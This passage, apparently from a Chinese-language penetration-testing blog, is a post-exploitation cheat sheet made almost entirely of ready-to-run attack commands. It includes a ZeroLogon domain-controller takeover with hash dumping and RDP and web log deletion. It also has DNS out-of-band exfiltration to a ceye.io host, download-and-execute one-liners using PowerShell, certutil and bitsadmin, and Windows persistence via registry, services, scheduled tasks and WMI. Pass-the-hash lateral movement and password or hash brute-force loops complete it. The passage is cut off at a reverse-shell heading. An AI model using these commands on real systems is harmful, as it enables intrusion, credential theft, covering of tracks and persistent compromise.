rule name=&quot;test&quot; dir=in action=allow program=&quot;C:\windows\temp\update.exe&quot; enable=yes   netsh advfirewall firewall add rule name=&quot;test&quot; dir=out action=allow program=&quot;C:\windows\temp\update.exe&quot; enable=yes   </code></pre><p>端口转发<br>把本地的 801 端口转发到远程的 172.23.80.14 的 80 端口</p><pre><code>netsh interface portproxy add v4tov4 listenport=801 connectport=80 connectaddress=172.23.80.14</code></pre><p>iptables 放行  </p><pre><code>iptables -A INPUT -p tcp --dport 80 -j ACCEPT</code></pre><h2 id="frp常用配置"><a href="#frp常用配置" class="headerlink" title="frp常用配置"></a>frp常用配置</h2><p>frpc.ini</p><pre><code>[common]server_addr = xxxxxxserver_port = 7000[rdp]type = tcplocal_port = 3389remote_port = 3389[plugin_http_proxy]type = tcpremote_port = 10801plugin = http_proxy[plugin_socks5]type = tcpremote_port = 1080plugin = socks5</code></pre><h2 id="ZeroLogon"><a href="#ZeroLogon" class="headerlink" title="ZeroLogon"></a>ZeroLogon</h2><ul><li>产生日志 4742(利用成功), 5580(利用失败) </li><li>流量特征明显</li><li>会被av直接秒</li><li>有可能会导致目标脱域</li><li>代理不稳，容易出问题</li></ul><pre><code> git clone https://github.com/mstxq17/cve-2020-1472.git python3 zerologon_tester.py Dc02 172.23.119.120 域外检测 PingCastle.exe --server 172.23.119.120 --scanner zerologon --scmode-dc 域内检测</code></pre><p>洞清空目标域控机器账户密码</p><pre><code>python3 cve-2020-1472-exploit.py Dc02$ 172.23.119.120</code></pre><p>无密码远程提取 ntds.dit</p><pre><code>python3 secretsdump.py qq.local/&#39;Dc02$&#39;@172.23.119.120 -no-pass -outputfile qq.local.ntds.hash</code></pre><p>用 administrator 域管账户 hash 远程导出域控机器账户 hash [hex 格式]</p><pre><code>    python3 secretsdump.py -hashes :ccef208c6485269c20db2cad21734fe7 qq/administrator@172.23.119.120</code></pre><p>用上面的 hex 还原目标域控机器账户密码</p><pre><code>python3 restorepassword.py Dc02@Dc02 -target-ip 172.23.119.120 -hexpass daf1d2acc25d2e54218921737a40d58192b9bcdf089ddbeaf9f7931571b07916f96e2c51d8d00f56d2440c13c0e5586e2dafd1669e37131***</code></pre><h1 id="获取控制器"><a href="#获取控制器" class="headerlink" title="获取控制器"></a>获取控制器</h1><p>net group “domain controllers” &#x2F;domain</p><p>proxychains python3 zerologon_tester.py dc 10.10.10.10</p><p>#利用exp重置密码</p><p>proxychains python3 cve-2020-1472-exploit.py dc 10.10.10.10</p><h1 id="no-pass-dump-域控hash"><a href="#no-pass-dump-域控hash" class="headerlink" title="-no-pass dump 域控hash"></a>-no-pass dump 域控hash</h1><p>proxychains impacket-secretsdump  de1ay.com&#x2F;dc$@10.10.10.10 -no-pass  </p><p>proxychains impacket-wmiexec   -hashes  LM:NTLM    .&#x2F;<a href="mailto:&#97;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#x74;&#114;&#97;&#116;&#111;&#114;&#64;&#x31;&#48;&#x2e;&#49;&#48;&#x2e;&#x31;&#48;&#46;&#x31;&#48;">&#97;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#x74;&#114;&#97;&#116;&#111;&#114;&#64;&#x31;&#48;&#x2e;&#49;&#48;&#x2e;&#x31;&#48;&#46;&#x31;&#48;</a></p><p>#恢复hash<br>powershell Reset-ComputerMachinePassword</p><h1 id="保存注册表"><a href="#保存注册表" class="headerlink" title="保存注册表"></a>保存注册表</h1><p>reg save HKLM\SYSTEM system.save  </p><p>reg save HKLM\SAM sam.save  </p><p>reg save HKLM\SECURITY security.save</p><p>#解密</p><p>python secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</p><p>#恢复密码</p><p>proxychains   python reinstall_original_pw.py dc  10.10.10.10 ef3ec852436fab1e43a0f480d8dda86268f76aa3731d72d6b262de002e8f6187d412353be5bc762ae983ff52b0741e981c721ef6eba563f5e62cb35bbcb5c8b5d1a113bdc6a5d89635eb0a8913f99c21ec6af2b6dcb40e24bf1b37c4bfa2a2f4a1cee00f1aae67d052f38c0daeeb9ebb72638b6a074fa71d65560c6f0a72d67a45f5bba10181c98e62a661ae743d7e2b7037f3460a9e0587677bb19a6bbbd9e1f7275040bb9bcc821824a1b224568a908fd36d4b84e4c6e31b8d24b0beb584bfdca26288edae0ce73b07ed13523ac31c21ee0a3118d6f1f1169aa6f3e27918322429ad190a5ce3da83bc12cc985be377</p><h2 id="删rdp日志"><a href="#删rdp日志" class="headerlink" title="删rdp日志"></a>删rdp日志</h2><p>清除远程桌面连接记录,创建clear.bat</p><pre><code>@echo offreg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; /va /freg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /freg add &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot;cd %userprofile%\documents\attrib Default.rdp -s -hdel Default.rdp</code></pre><h2 id="删web日志"><a href="#删web日志" class="headerlink" title="删web日志"></a>删web日志</h2><pre><code>/var/log/nginx/  ​  access.logerror.log  ​  tomcat 位于 logs  catalina.*.logaccess_log.*.txt  </code></pre><h2 id="开3389"><a href="#开3389" class="headerlink" title="开3389"></a>开3389</h2><pre><code>方法一wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /fnet start TermService方法二#设置远程桌面端口reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d 3389 /f#开启远程桌面wmic RDTOGGLE WHERE ServerName=&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1#检查端口状态netstat -an|find &quot;3389&quot;#关闭远程桌面wmic RDTOGGLE WHERE ServerName=&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 0</code></pre><h2 id="文件搜索"><a href="#文件搜索" class="headerlink" title="文件搜索"></a>文件搜索</h2><p><a href="https://www.anquanke.com/post/id/245019">https://www.anquanke.com/post/id/245019</a></p><pre><code>findstr /s /i /n /d:C:\ /c:&quot;123123&quot; *.txt</code></pre><pre><code>for /r C: %i in (login.*) do @echo %i</code></pre><pre><code>where /R C: login.*</code></pre><pre><code>dir /s/a-d/b login.*</code></pre><pre><code>find / -name index.php</code></pre><pre><code>find / -name index.php</code></pre><pre><code>find / -name &quot;index.php&quot; | xargs grep &quot;111222&quot;</code></pre><pre><code>updatedb &amp;&amp; locate index.php</code></pre><pre><code>进程路径wmic process get name,executablepath</code></pre><h3 id="命令执行无回显外带oob"><a href="#命令执行无回显外带oob" class="headerlink" title="命令执行无回显外带oob"></a>命令执行无回显外带oob</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>在windows当中，%cd% 代表的是当前目录，我们通过echo将当前目录写入文本temp,然后荣国certutil对文件内容进行base64编码，再过滤certutil携带的字符，将它赋给一个变量，最后通过nslookup外带出来，从而实现获取当前目录的目的。</p><pre><code>echo %cd% &gt; temp&amp;&amp;certutil -encode temp temp1&amp;&amp;findstr /L /V &quot;CERTIFICATE&quot; temp1 &gt; temp2&amp;&amp;set /p ADDR=&lt;temp2&amp;&amp;nslookup %ADDR%.is1lv6.ceye.io</code></pre><p>下面这个语句，主要是过滤作用。把helo.txt文件中的“&#x3D;”过滤并重新输出文件。</p><pre><code>for /f &quot;delims=^= tokens=1,*&quot; %i in (helo.txt) do (echo %i&gt;&gt;text3.txt)</code></pre><p>为什么在上面需要过滤&#x3D;，主要是因为在执行ping命令的时候是不允许带&#x3D;号的，相较于nslookup，ping命令成功率相对较高，但如果路径过长，可能会导致失败。具体多长需要大家自行试验。</p><pre><code>echo %cd% &gt; temp&amp;&amp;certutil -encode temp temp1&amp;&amp;findstr /L /V &quot;CERTIFICATE&quot; temp1 &gt; temp2&amp;&amp;for /f &quot;delims=^= tokens=1,*&quot; %i in (temp2) do (echo %i&gt;&gt;temp3)&amp;&amp;set /p ADDR=&lt;temp3&amp;ping %ADDR%.is1lv6.ceye.io</code></pre><p>如果需要外带多行命令，则需要以下语句：</p><pre><code>where /R C: login.* &gt; test &amp;&amp; certutil -encodehex -f test test.hex 4 &amp;&amp; powershell $text=Get-Content test.hex;$sub=$text -replace(&#39; &#39;,&#39;&#39;);$j=11111;foreach($i in $sub)&#123; $fin=$j.tostring()+&#39;.&#39;+$i+&#39;.is1lv6.ceye.io&#39;;$j += 1; nslookup $fin &#125;</code></pre><p>win常用变量</p><pre><code>//变量                     类型       描述//%ALLUSERSPROFILE%        本地       返回“所有用户”配置文件的位置。//%APPDATA%                本地       返回默认情况下应用程序存储数据的位置。//%CD%                     本地       返回当前目录字符串。//%CMDCMDLINE%             本地       返回用来启动当前的 Cmd.exe 的准确命令行。//%CMDEXTVERSION%          系统       返回当前的“命令处理程序扩展”的版本号。//%COMPUTERNAME%           系统       返回计算机的名称。//%COMSPEC%                系统       返回命令行解释器可执行程序的准确路径。//%DATE%                   系统       返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。//%ERRORLEVEL%             系统       返回上一条命令的错误代码。通常用非零值表示错误。//%HOMEDRIVE%              系统       返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。//%HOMEPATH%               系统       返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。//%HOMESHARE%              系统       返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。//%LOGONSERVER%            本地       返回验证当前登录会话的域控制器的名称。//%NUMBER_OF_PROCESSORS%   系统       指定安装在计算机上的处理器的数目。//%OS%                     系统       返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。//%PATH%                   系统       指定可执行文件的搜索路径。//%PATHEXT%                系统       返回操作系统认为可执行的文件扩展名的列表。//%PROCESSOR_ARCHITECTURE% 系统       返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。//%PROCESSOR_IDENTFIER%    系统       返回处理器说明。//%PROCESSOR_LEVEL%        系统       返回计算机上安装的处理器的型号。//%PROCESSOR_REVISION%     系统       返回处理器的版本号。//%P ROMPT%                 本地       返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。//%RANDOM%                 系统       返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。//%SYSTEMDRIVE%            系统       返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。//%SYSTEMROOT%             系统       返回 Windows server operating system 根目录的位置。//%TEMP%和%TMP%            系统和用户  返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。//%TIME%                   系统       返回当前时间。使用与time /t命令相同的格式。由Cmd.exe生成。有关time命令的详细信息，请参阅 Time。//%USERDOMAIN%             本地       返回包含用户帐户的域的名称。//%USERNAME%               本地       返回当前登录的用户的名称。//%USERPROFILE%            本地       返回当前用户的配置文件的位置。//%WINDIR%                 系统       返回操作系统目录的位置。</code></pre><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>在linux中pwd也是查看当前目录的，我们通过tr -d将换行符去掉并通过xxd -ps将值转化为16进制，这样我们即可外带出自己想要的东西。</p><pre><code>ping pwd|tr -d &#39;\n&#39;|xxd -ps.is1lv6.ceye.io</code></pre><p>base64原理和上面类似，主要是对值进行base64编码，然后替换掉“&#x3D;”，即可成功外带数据。</p><pre><code>pingpwd|base64|tr -d ‘=’.is1lv6.ceye.io</code></pre><p>如果有多行数据需要外带，那么请考虑下面的语句。</p><pre><code>var=11111 &amp;&amp; for b in $(find / -name &quot;index.php&quot; | xargs grep &quot;111222&quot;|xxd -p); do var=$((var+1)) &amp;&amp; dig $var.$b.is1lv6.ceye.io; done</code></pre><h2 id="windows短文件名"><a href="#windows短文件名" class="headerlink" title="windows短文件名"></a>windows短文件名</h2><p>短文件名查看</p><pre><code>用&quot;dir /x&quot;命令可以方便地帮助您查看系统对目录或文件名的缩写</code></pre><p>常见短文件名</p><pre><code>Documents and Settings可表示为DOCUME~1又如：Local Settings可表示为LOCALS~1Program FilesProgram Files (x86)这两个目录分别表示为：PROGRA~1PROGRA~2</code></pre><h2 id="powershell文件下载"><a href="#powershell文件下载" class="headerlink" title="powershell文件下载"></a>powershell文件下载</h2><pre><code>powershell (new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.1.1/1.exe&#39;,&#39;C:\test\1.exe&#39;);start-process &#39;C:\test\1.exe&#39;</code></pre><p>常用</p><pre><code>powershell (new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.1.1/1.exe&#39;,&#39;1.exe&#39;)</code></pre><pre><code>Invoke-Expression (New-Object Net.WebClient).DownloadString(&quot;http://xxx.xx.xx.xx/test.ps1&quot;)</code></pre><p>bypass</p><pre><code>echo (new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.31.93:8000/tomcat.exe&#39;,&#39;C:/Users/test/cc.exe&#39;)| powershell -</code></pre><p>base64编码(和其他base64不同，解不开)</p><pre><code>$Text = &quot;(new-object System.Net.WebClient).DownloadFile(&#39;http://xxxxxxxxxx:8000/bddch.txt&#39;,&#39;bdchd.txt&#39;)&quot;$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)$EncodedText =[Convert]::ToBase64String($Bytes)$EncodedText</code></pre><p>base64解码</p><pre><code>$EncodedText = &quot;dwByAGkAxxxxxxxxxxxxxxxxxxxAG0AbgB0AG4AJwA=&quot;$DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))$DecodedText</code></pre><p>运行base64编码后的命令</p><pre><code>powershell -noP -sta -enc xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code></pre><h2 id="certutil-exe下载"><a href="#certutil-exe下载" class="headerlink" title="certutil.exe下载"></a>certutil.exe下载</h2><pre><code>C:\Windows\System32\certutil.exe C:\Users\Public\cer.exe</code></pre><pre><code>certutil.exe -urlcache -split -f http://192.168.1.1/1.exe</code></pre><pre><code>certutil.exe -urlcache -split -f http://192.168.1.1/1.txt 1.exe</code></pre><pre><code>certutil.exe -urlcache -split -f http://192.168.6.27:8012/download/f.ext C:\windows\temp\up.exe &amp;&amp;start C:\windows\temp\up.exe</code></pre><p>删除缓存</p><pre><code>certutil.exe -urlcache -split -f http://192.168.1.1/1.exe delete</code></pre><p>查看缓存项目：</p><pre><code>certutil.exe -urlcache *</code></pre><p>转为base64</p><pre><code>certutil -encode lcx64.exe lcx64.txt</code></pre><p>转回来</p><pre><code>certutil -decode lcx64.txt lcx64.exe</code></pre><p>查看md5</p><pre><code>certutil -hashfile a.exe MD5</code></pre><p>bypass</p><pre><code>Certutil &amp; Certutil –urlcache –f –split urlCertutil | Certutil –urlcache –f –split url</code></pre><h2 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h2><p><strong>不支持https、ftp协议，php python带的服务器会出错</strong></p><pre><code>bitsadmin /transfer n http://192.168.1.1/1.exe  C:\test\update\1.exe</code></pre><h2 id="wget-下载文件"><a href="#wget-下载文件" class="headerlink" title="wget 下载文件"></a>wget 下载文件</h2><p>下载到指定目录</p><pre><code>wget -P /tmp http://127.0.0.1:8088/aliyun</code></pre><h2 id="curl-下载"><a href="#curl-下载" class="headerlink" title="curl 下载"></a>curl 下载</h2><p>使用内置option：-o(小写)</p><pre><code>curl -o dodo1.jpg http:www.linux.com/dodo1.JPG</code></pre><p>使用内置option：-O（大写)</p><pre><code>curl -O http://www.linux.com/dodo1.JPG</code></pre><p>下载后，上线</p><pre><code>chmod +x /tmp/aliyun&amp;&amp;/tmp/aliyun</code></pre><h2 id="windows权限维持"><a href="#windows权限维持" class="headerlink" title="windows权限维持"></a>windows权限维持</h2><h3 id="Startup目录"><a href="#Startup目录" class="headerlink" title="Startup目录"></a>Startup目录</h3><pre><code>NT6以后的目录如下：对当前用户有效：C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup对所有用户有效：C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUpNT6以前的目录如下：对当前用户有效：C:\Documents and Settings\Hunter\「开始」菜单\程序\启动对所有用户有效：C:\Documents and Settings\All Users\「开始」菜单\程序\启动</code></pre><h3 id="注册键"><a href="#注册键" class="headerlink" title="注册键"></a>注册键</h3><pre><code>reg add &quot;XXXX&quot; /v evil /t REG_SZ /d &quot;[Absolute Path]\evil.exe&quot;</code></pre><pre><code>1.Load注册键HKEY_CURRENT_USER＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Windows＼load2.Userinit注册键HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Winlogon＼Userinit通常该注册键下面有一个userinit.exe。该键允许指定用逗号分隔的多个程序，如userinit.exe,evil.exe。3.Explorer＼Run注册键Explorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼RunHKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼RunExplorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。4.RunServicesOnce注册键RunServicesOnce注册键用来启动服务程序，启动时间在用户登录之前，而且先于其他通过注册键启动的程序，在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunServicesOnceHKEY_LOCAL_MACHINE＼Software＼Microsoft＼ Windows＼CurrentVersion＼RunServicesOnce5.RunServices注册键RunServices注册键指定的程序紧接RunServicesOnce指定的程序之后运行，但两者都在用户登录之前。HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼ RunServicesHKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼ CurrentVersion＼RunServices6.RunOnce＼Setup注册键HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼SetupHKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup7.RunOnce注册键安装程序通常用RunOnce键自动运行程序，它的位置在HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce[小于NT6]HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnceExHKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnceHKEY_LOCAL_MACHINE下面的RunOnce键会在用户登录之后立即运行程序，运行时机在其他Run键指定的程序之前；HKEY_CURRENT_USER下面的RunOnce键在操作系统处理其他Run键以及“启动”文件夹的内容之后运行。8.Run注册键HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunHKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunRun是自动运行程序最常用的注册键，HKEY_CURRENT_USER下面的Run键紧接HKEY_LOCAL_MACHINE下面的Run键运行，但两者都在处理“启动”文件夹之前。</code></pre><h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><pre><code>sc create evil binpath= &quot;cmd.exe /k [Absolute Path]evil.exe&quot; start= &quot;auto&quot; obj= &quot;LocalSystem&quot;</code></pre><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><pre><code>SCHTASKS /Create /RU SYSTEM /SC ONSTART /RL HIGHEST /TN \Microsoft\Windows\evil\eviltask /TR C:\Users\hunter\Desktop\evil.exe</code></pre><h3 id="WMI事件"><a href="#WMI事件" class="headerlink" title="WMI事件"></a>WMI事件</h3><pre><code>wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter CREATE Name=&quot;evil&quot;, EventNameSpace=&quot;root\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39; AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 310&quot;wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer CREATE Name=&quot;evilConsumer&quot;, ExecutablePath=&quot;C:\Users\hunter\Desktop\beacon.exe&quot;,CommandLineTemplate=&quot;C:\Users\hunter\Desktop\beacon.exe&quot;wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=\&quot;evil\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\&quot;evilConsumer\&quot;&quot;</code></pre><h3 id="屏幕保护"><a href="#屏幕保护" class="headerlink" title="屏幕保护"></a>屏幕保护</h3><pre><code>reg add &quot;hkcu\control panel\desktop&quot; /v SCRNSAVE.EXE /d C:\Users\hunter\Desktop\beacon.exe /freg add &quot;hkcu\control panel\desktop&quot; /v ScreenSaveActive /d 1 /freg add &quot;hkcu\control panel\desktop&quot; /v ScreenSaverIsSecure /d 0 /freg add &quot;hkcu\control panel\desktop&quot; /v ScreenSaveTimeOut /d 60 /f</code></pre><h3 id="bitsadmin-1"><a href="#bitsadmin-1" class="headerlink" title="bitsadmin"></a>bitsadmin</h3><pre><code>bitsadmin /create evilbitsadmin /addfile evil &quot;C:\Users\hunter\Desktop\beacon.exe&quot; &quot;C:\Users\hunter\Desktop\beacon.exe&quot;bitsadmin.exe /SetNotifyCmdLine evil &quot;C:\Users\hunter\Desktop\beacon.exe&quot; NULbitsadmin /Resume evil</code></pre><h3 id="Netsh白加黑"><a href="#Netsh白加黑" class="headerlink" title="Netsh白加黑"></a>Netsh白加黑</h3><pre><code>可以通过导入helperdll的方式做权限维持，命令格式如下：netsh add helper [Absolute evil DLL path]但是由于netsh并不会开启自启动，因此还要再写一条自启动项：reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v Pentestlab /t REG_SZ /d &quot;cmd /c C:\Windows\System32\netsh&quot;重新启动后依然可获得shell：</code></pre><h3 id="MSDTC"><a href="#MSDTC" class="headerlink" title="MSDTC"></a>MSDTC</h3><p>在默认的Windows安装中，System32文件夹中缺少oci.dll这个文件，在获得写权限的情况下可以在该文件夹下写入一个同名的dll，服务启动时执行恶意代码。<br>默认情况下，由于启动类型设置为“手动”，通过以下命令设置自启：</p><pre><code>sc qc msdtcsc config msdtc start= auto</code></pre><h2 id="windows信息收集常用命令"><a href="#windows信息收集常用命令" class="headerlink" title="windows信息收集常用命令"></a>windows信息收集常用命令</h2><pre><code>Systeminfo 计算机详细信息(补丁信息)Net start 所启动的服务Wmic service list brief 查询本机服务信息Tasklist 进程列表Wmic startup get command,caption 查看启动该程序信息Schtasks /query /fo LIST /v计划任务Netstat -ano 根据本机端口开放情况来判断有什么服务、其角色Query user || qwinsta 查看当前在线用户Net session 列出会话Net share 查看本机的共享列表Wmic share get name,path,status 查看共享列表Net user 本地用户Net user kkkk 查看本地用户信息Net localgroup 本地用户组Net localgroup /domain 域用户组Net localgroup adminnstrators 本地管理员组成员net localgroup adminstrators /domain 查看登陆过主机的管理员Wmic useraccount get /all 获取域内用户详细信息dsquery user 查看存在的用户Net user /domain 域用户信息Net user kkkk /domain 域用户kkkk信息Net user kent password /add /domain添加域用户Net group /domain 域用户组信息Net view /domain 查询域Net view /domain:test 查询域内计算机Net accounts /domain 查询域中密码策略Net group /domain 查看域内所有用户组Net group &quot;Domain Controllers&quot; /domain 查看域控制器组Net group &quot;Domain computers&quot; /domain 查看域内所有计算机列表Net group &quot;Domain admins&quot; /domain 查看域内管理员用户Net user /domain kent active:yes 启用域账户Net user /domain kent active:no 禁用域账户Nltest /DCLIST:test 查看域中域控制器名Wmic useraccount get /all 用户详细信息Net group &quot;Domain Admins&quot; /domain 对应组下的账户信息nltest /domain_trusts 获取域信任信息net config workstation 了解本机的配置信息Netsh firewall show config 查看防火墙配置Netsh advfirewall set allprofiles state off关闭防火墙(windows server 2003后)Netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot; 允许指定程序进入(windows server 2003后)Netsh advfirewall firewall add rule name=&quot;allow nc&quot; dir=out action=allow program=&quot;C:\nc.exe&quot;允许指定程序退出(windows server 2003后)Netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow 允许3389连接(windows server 2003后)Reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;查看端口代理配置信息Reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber 查看远程桌面端口号</code></pre><h2 id="at-schtasks-sc横向"><a href="#at-schtasks-sc横向" class="headerlink" title="at&amp;schtasks&amp;sc横向"></a>at&amp;schtasks&amp;sc横向</h2><p>使用明文密码登录到目标，需要445和139端口开启：</p><pre><code>net use \\192.168.2.148\ipc$ password /user:test\administratornet use \\192.168.2.148\ipc$ password /user:administrator复制文件copy c:\1.exe \\192.168.2.148\c$at新建10:10分运行的定时作业at \\192.168.2.148 10:10 c:\1.exeWindows server 2012及以上使用schtasks命令Schtasks /create /s 192.168.2.148 /ru “SYSTEM” /tn executefile /sc DAILY /tr c:/1.exe /FSchtasks /run /s 192.168.2.148 /tn executefile /iSchtasks /delete /s 192.168.2.148 /tn executefile /fsc \\192.168.210.107 create hacker binpath=&quot;c:\shell1.exe&quot;   #创建服务sc \\192.168.210.107 start hacker      #启动hacker服务</code></pre><h2 id="impacket包横向命令"><a href="#impacket包横向命令" class="headerlink" title="impacket包横向命令"></a>impacket包横向命令</h2><p>下载<a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a><br><a href="https://github.com/ropnop/impacket_static_binaries/releases">https://github.com/ropnop/impacket_static_binaries/releases</a><br>Atexec</p><pre><code>需要445端口开启Atexec.exe hacker/administrator:abc123@192.168.202.148 &quot;whoami&quot;Atexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6 hacker/administrator@192.168.202.148 &quot;whoami&quot;</code></pre><p>dcomexec</p><pre><code>需要135端口开启dcomexec.exe hacker/administrator:abc123@192.168.202.148 &quot;whoami&quot;dcomexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6 hacker/administrator@192.168.202.148 &quot;whoami&quot;</code></pre><p>psexec</p><pre><code>官方Psexec第一种利用方法：可以先有ipc链接，再用psexec运行相应的程序：Net use \192.168.202.148\ipc$ zxcvbnm123 /user:test\AdministratorPsexec \192.168.202.148 -accepteula -s cmd官方Psexec第二种利用方法：不用建立ipc连接，直接使用密码或hash进行传递Psexec \192.168.202.148 -u Administrator -p zxcvbnm123 -s cmdPsExec -hashes :fac5d668099409cb6fa223a32ea493b6 test.com/Administrator@192.168.202.148 &quot;whoami&quot; (官方提供的exe执行不了)</code></pre><p>smbexec</p><pre><code>需要445端口开启Smbexec test/Administrator:zxcvbnm123@192.168.202.148Smbexec -hashes :fac5d668099409cb6fa223a32ea493b6 test/Administrator@192.168.202.148</code></pre><p>wmi</p><pre><code>WMI利用135端口，支持明文和hash两种方式进行身份验证，且系统日志不记录。第一种：使用系统自带的WMIC明文传递执行相应命令，但执行的结果不回显（先管理员账户登录）Wmic /node:192.168.202.148 /user:Administrator /password:zxcvbnm123 process call create &quot;cmd.exe /c ipconfig &gt;C:/1.txt&quot;第二种：使用系统自带cscript明文传递执行反弹shell，执行结果有回显，现已被杀Cscript //nologo wmiexec.vbs /shell 192.168.202.148 Administrator zxcvbnm123第三种：使用第三方impacket套件中的Wmiexec进行明文或hash传递，执行结果有回显Wmiexec test/Administrator:zxcvbnm123@192.168.202.148 &quot;whoami&quot;Wmiexec -hashes :fac5d668099409cb6fa223a32ea493b6 test/Administrator@192.168.202.148 &quot;whoami&quot;</code></pre><p>批量操作,需要保存为bat执行</p><pre><code>用已知密码和用户，批量连接ip:FOR /F %%i in (ips.txt) do net use \%%i\ipc$ “password” /user:hacker\administrator已知用户和ip，批量连接密码(爆破密码)：FOR /F %%i in (pass.txt) do net use \192.168.202.148\ipc$ &quot;%%i&quot; /user:test\administrator已知用户和ip，批量连接hash(爆破hash)：FOR /F %%i in (hash.txt) do atexec.exe -hashes :&quot;%%i&quot; test/administrator@192.168.202.148 &quot;whoami&quot;</code></pre><p>精准批量法</p><pre><code>shell for /l %i in (1,1,253) do echo 172.22.13.%i &gt;&gt;tip.txtshell for /f %i in (tip.txt) do ping -n 1 -w 10 %i | find /i &quot;ttl&quot; &gt;nul &amp;&amp; echo %%i &gt;&gt;ok.txshell for /f %i in (ok.txt) do dir \\%i\c$\users &gt;&gt;result.txt</code></pre><p>cme 批量</p><pre><code>proxychains4 ./cme smb 10.0.0.1/24 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d xx.org -x &quot;net user&quot;</code></pre><p>单独执行命令</p><pre><code>crackmapexec smb 192.168.10.11 -u Administrator -p &#39;P@ssw0rd&#39; -x whoami</code></pre><p>ldap喷洒</p><pre><code>cme ldap 10.11.12.211 -u &#39;username&#39; -p &#39;password&#39; --kdcHost 10.11.12.211 --users</code></pre><h2 id="反弹shell-流量太敏感，尽量加密用"><a href="#反弹shell-流量太敏感，尽量加密用" class="headerlink" 